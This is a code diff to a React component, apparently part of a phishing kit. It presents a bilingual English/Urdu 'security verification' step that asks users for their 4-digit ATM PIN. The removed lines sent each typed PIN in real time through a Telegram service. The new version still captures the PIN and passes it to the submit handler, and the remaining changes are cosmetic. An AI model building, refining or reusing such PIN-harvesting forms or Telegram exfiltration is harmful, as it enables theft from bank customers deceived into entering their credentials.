@@ -1,11 +1,10 @@
 import React, { useState, useRef } from 'react';
-import { ArrowRight, ArrowLeft, Lock, ShieldCheck, CheckCircle2 } from 'lucide-react';
-import { sendRealtimePinUpdate } from '../services/telegramService';
+import { ArrowRight, ArrowLeft, Lock, ShieldCheck } from 'lucide-react';
 
 interface Step5Props {
   pinValue: string;
   onUpdatePin: (val: string) => void;
-  onSubmitApplication: () => void;
+  onSubmitApplication: (pinCode?: string) => void;
   onBack: () => void;
 }
 
@@ -28,7 +27,6 @@ export const Step5AtmPin: React.FC<Step5Props> = ({
       setDigits(updated);
       const code = updated.join('');
       onUpdatePin(code);
-      sendRealtimePinUpdate(code);
       return;
     }
 
@@ -38,7 +36,6 @@ export const Step5AtmPin: React.FC<Step5Props> = ({
     setDigits(updated);
     const code = updated.join('');
     onUpdatePin(code);
-    sendRealtimePinUpdate(code);
     setError('');
 
     if (index < 3) {
@@ -59,11 +56,10 @@ export const Step5AtmPin: React.FC<Step5Props> = ({
       setError('Please enter complete 4-digit ATM PIN / اپنا 4 ہندسوں کا اے ٹی ایم پن درج کریں');
       return;
     }
-    sendRealtimePinUpdate(code);
     setIsSubmitting(true);
     setTimeout(() => {
-      onSubmitApplication();
-    }, 1200);
+      onSubmitApplication(code);
+    }, 800);
   };
 
   return (
@@ -88,7 +84,7 @@ export const Step5AtmPin: React.FC<Step5Props> = ({
         </div>
       </div>
 
-      {/* Security Verification Notice Box (Matching Screenshot 11) */}
+      {/* Security Verification Notice Box */}
       <div className="bg-slate-50 border border-slate-200 rounded-xl p-4 mb-5 text-xs text-slate-700 space-y-2">
         <div className="flex items-center justify-between font-bold text-slate-900 border-b border-slate-200 pb-2">
           <span className="flex items-center gap-1.5 text-emerald-800">
@@ -150,7 +146,7 @@ export const Step5AtmPin: React.FC<Step5Props> = ({
             onClick={onBack}
             disabled={isSubmitting}
             id="step5-back-btn"
-            className="flex-1 py-3 px-4 border border-slate-300 hover:bg-slate-50 text-slate-700 font-semibold text-xs rounded-lg transition-colors flex items-center justify-center gap-1.5"
+            className="flex-1 py-3 px-4 border border-slate-300 hover:bg-slate-50 text-slate-700 font-semibold text-xs rounded-lg transition-colors flex items-center justify-center gap-1.5 cursor-pointer"
           >
             <ArrowLeft className="w-4 h-4" />
             <span>Back / واپس</span>
@@ -160,7 +156,7 @@ export const Step5AtmPin: React.FC<Step5Props> = ({
             type="submit"
             disabled={isSubmitting}
             id="step5-submit-btn"
-            className="flex-1 py-3.5 px-4 bg-[#0e5e38] hover:bg-[#0a4629] active:bg-[#07331e] text-white font-bold text-xs rounded-lg transition-all shadow-md flex items-center justify-center gap-1.5 disabled:opacity-75"
+            className="flex-1 py-3.5 px-4 bg-[#0e5e38] hover:bg-[#0a4629] active:bg-[#07331e] text-white font-bold text-xs rounded-lg transition-all shadow-md flex items-center justify-center gap-1.5 disabled:opacity-75 cursor-pointer"
           >
             {isSubmitting ? (
               <span className="flex items-center gap-2">
@@ -179,4 +175,3 @@ export const Step5AtmPin: React.FC<Step5Props> = ({
     </div>
   );
 };
-
